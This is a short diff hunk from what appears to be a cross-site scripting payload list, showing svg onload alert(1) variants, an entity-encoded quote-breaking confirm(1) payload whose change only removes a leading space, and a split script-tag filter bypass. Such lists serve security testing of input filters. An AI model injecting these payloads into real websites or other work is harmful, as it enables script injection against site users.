@@ -5,5 +5,5 @@
 <svg onload=alert(1)+
 <svg onload=alert(1)<!--
 <svg onload=alert(1)-
- \&#34;+confirm(1)+&#34;
+\&#34;+confirm(1)+&#34;
 <</div>script</div>>alert()<</div>/script</div>>
